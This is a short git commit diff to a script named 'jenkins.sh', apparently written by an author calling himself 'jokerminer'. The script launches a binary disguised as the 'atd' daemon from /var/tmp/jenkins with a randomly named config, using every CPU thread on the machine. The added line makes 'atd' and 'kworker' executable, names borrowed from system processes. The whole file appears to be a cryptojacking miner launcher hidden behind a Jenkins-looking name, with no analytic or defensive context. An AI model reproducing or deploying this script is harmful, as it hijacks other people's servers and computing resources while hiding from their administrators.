27f0661a71ed4f12c1a48f702950b6735679ae45
jokerminer <34443698+attackjoker11@users.noreply.github.com>
2018-01-17 15:43:27 +0530

    Update jenkins.sh

--- jenkins.sh
+++ jenkins.sh
@@ -1,6 +1,7 @@
 #!/bin/bash
 count=$(ps -ef | grep -v grep | grep atd | grep conf| wc -l)
 thread=$(lscpu | grep 'CPU(s)' | grep -v ',' | awk '{print $2}' | head -n 1)
+chmod +x /var/tmp/jenkins/atd && chmod +x /var/tmp/jenkins/kworker
 echo $count
 if [ $count -lt 1 ]; then
 cd /var/tmp/jenkins && ./atd -c honvbsasbf.conf -t $thread -B
